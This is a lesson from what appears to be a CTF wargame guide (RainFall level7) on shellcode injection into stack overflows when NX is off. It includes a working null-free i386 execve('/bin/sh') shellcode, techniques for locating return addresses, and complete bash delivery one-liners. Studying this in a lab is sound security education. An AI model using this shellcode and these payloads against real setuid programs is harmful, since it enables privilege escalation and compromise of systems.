# Lesson 04 — Shellcode Injection (when NX is off)

> Maps to **level7** (and any No-NX overflow). Prereq: lessons 00–01.

## When this applies

`checksec` says **NX disabled** → the stack (and often the heap) is **executable**. So you can place your own machine code (shellcode) in memory the program reads, then redirect EIP to it. This is usually simpler than ROP — reach for it whenever NX is off.

## The plan

1. **Get executable, controllable memory.** Your overflow buffer on the stack, an environment variable, or `argv` all work if the stack is executable. Bigger, stable buffers (env vars) are easier to land on.
2. **Put shellcode there.** A standard i386 `execve("/bin/sh", NULL, NULL)`.
3. **Redirect EIP** (via the stack overflow, lesson 01) to an address **inside** your shellcode region.
4. **Absorb imprecision** with a **NOP sled**: a run of `0x90` (NOP) before the shellcode. If EIP lands anywhere in the sled, it slides down into the shellcode. This is how you survive not knowing the exact address.

## A classic 32-bit execve("/bin/sh") shellcode (25 bytes, null-free)

```
\x31\xc0            xor eax,eax        ; eax = 0
\x50                push eax           ; null terminator for "/bin//sh"
\x68\x2f\x2f\x73\x68 push "//sh"
\x68\x2f\x62\x69\x6e push "/bin"
\x89\xe3            mov ebx,esp        ; ebx -> "/bin//sh"
\x50                push eax           ; envp = NULL
\x53                push ebx           ; argv[0]
\x89\xe1            mov ecx,esp        ; ecx -> argv
\x31\xd2            xor edx,edx        ; edx = envp = NULL
\xb0\x0b            mov al,0x0b        ; syscall 11 = execve
\xcd\x80            int 0x80
```
Why null-free matters: if your delivery path is `strcpy`/`gets`, a `0x00` byte truncates the copy. This shellcode avoids nulls (that's why it uses `//sh` and `xor` instead of `mov 0`). If your path is `read()` with a fixed length, nulls are fine and you have more freedom.

For a **setuid** binary that dropped privileges, you may need to prepend `setreuid(0,0)` / `setresuid` shellcode so the shell keeps the elevated euid. Check whether the binary already keeps euid or drops it.

## Finding the return address (the hard part)

You must point EIP into your sled. Options, roughly in order of robustness:

- **NOP sled + approximate address.** Make the sled large (dozens–hundreds of bytes) and aim EIP somewhere in its middle. Wide margin = reliable.
- **Read ESP in gdb.** Break at the vulnerable function's `ret`, `x/40wx $esp`, find your `\x90\x90…` and pick an address inside it. Then account for **gdb drift** (below).
- **Env-var placement.** Put the shellcode in an environment variable; its address is fairly stable and computable:
  `addr ≈ 0xbffffffa - len("/path/to/binary") - len(name=value)`. A tiny helper program (`getenv`) that prints the env address on the *same* box gives you the exact value.
- **`jmp esp` style** isn't typical on i386 RainFall, but if a register points at your buffer at the moment of `ret`, a `jmp <reg>`/`call <reg>` gadget removes address guessing entirely.

### gdb-vs-shell drift (this will waste your afternoon if you ignore it)

gdb pushes extra environment variables and a longer `argv[0]` (the full path), so **stack addresses inside gdb are shifted** (usually a bit higher) versus a bare `./level7` run. Mitigations:
- Big NOP sled so the shift stays within the sled.
- Launch identically: `env - ./level7` or replicate gdb's env; match `argv[0]`.
- Put shellcode in an env var and compute its address with a helper run in the **same** shell environment you'll exploit from.
- Bracket: try a few addresses across the sled.

## Delivery patterns

Reuse the shell cookbook from lesson 00 §6 (`head`/`tr` for sleds and padding, `printf` for raw bytes). Keep the shellcode as one `printf` of null-free bytes:

```bash
# via stdin, keeping the shell open afterward (the trailing `cat` holds stdin for the spawned shell)
{ head -c 200 /dev/zero | tr '\0' '\220'                                                    # NOP sled
  printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'  # execve("/bin/sh") shellcode
  head -c PAD /dev/zero | tr '\0' 'A'                                                        # pad up to the offset
  printf '\x78\xf6\xff\xbf'                                                                  # return address landing inside the sled
  cat; } | ./level7

# via an env var, then overflow EIP to the env address
export EGG="$(head -c 200 /dev/zero | tr '\0' '\220')$(printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80')"
./level7 "$(head -c OFFSET /dev/zero | tr '\0' 'A')$(printf '\xNN\xNN\xNN\xNN')"   # EGG_ADDR, little-endian
```
`layout`: `[ NOP sled ][ shellcode ][ padding up to offset ][ return address into the sled ]` — or put the sled+shellcode *after* the return address if there's more room past EIP.

## i386 gotchas

- **Null bytes** in shellcode or in the return address break `strcpy`-based delivery. Prefer null-free shellcode; if the return address needs a null high byte, that's often unavoidable — put it last.
- **Buffer too small for shellcode?** Stash the shellcode in an env var or `argv` (lots of room) and only put the return address in the small overflow.
- **Cache/again**: addresses can wobble run-to-run even without ASLR due to env size — keep the sled generous.
- Confirm the stack is actually executable (`checksec`, or gdb `info proc mappings` shows the stack `rwx`).

## Questions to ask yourself

- Is NX really off / stack `rwx`? (Otherwise go to lesson 03.)
- Where am I putting the shellcode — overflow buffer, env, or argv — and is there enough room?
- Is my shellcode null-free for the delivery path I'm using?
- Does the binary drop privileges? Do I need a `setreuid` prefix?
- What return address am I using, how did I obtain it, and how wide is my NOP sled margin against gdb-vs-shell drift?
- Did I keep stdin open (`cat`) so the spawned shell doesn't immediately EOF?

## Defensive takeaway

Enabling **NX** (`-z noexecstack`, the default for decades now) kills this entire class outright — the single most impactful mitigation to mention for level7.
